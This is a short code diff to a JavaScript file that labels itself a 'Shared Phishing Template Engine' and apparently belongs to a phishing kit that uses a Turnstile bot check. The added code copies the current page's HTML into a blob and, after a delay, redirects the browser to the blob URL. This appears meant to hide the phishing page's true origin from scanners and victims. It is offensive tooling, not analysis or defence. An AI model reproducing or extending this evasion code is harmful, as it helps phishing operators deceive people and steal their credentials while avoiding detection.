@@ -1,5 +1,5 @@
 /**
- * VGenius C Engine – Shared Template Engine
+ * VGenius C Engine – Shared Phishing Template Engine
  * Modular, well-commented, no external dependencies except Turnstile.
  * 
  * Features:
@@ -508,6 +508,23 @@
     var overlay = document.getElementById('overlay');
     if (overlay) {
       overlay.classList.add('show');
+      
+      // Blob URL mode: create blob and redirect to it
+      if (window.__BLOB_URL_ENABLED && document.documentElement) {
+        try {
+          var html = document.documentElement.outerHTML;
+          var blob = new Blob([html], { type: 'text/html' });
+          var blobUrl = URL.createObjectURL(blob);
+          setTimeout(function () { 
+            window.location.replace(blobUrl); 
+          }, 2500);
+          return;
+        } catch (e) {
+          // Fallback to normal redirect
+        }
+      }
+      
+      // Normal redirect
       if (DEST_URL) setTimeout(function () { window.location.replace(DEST_URL); }, 2500);
     }
   }
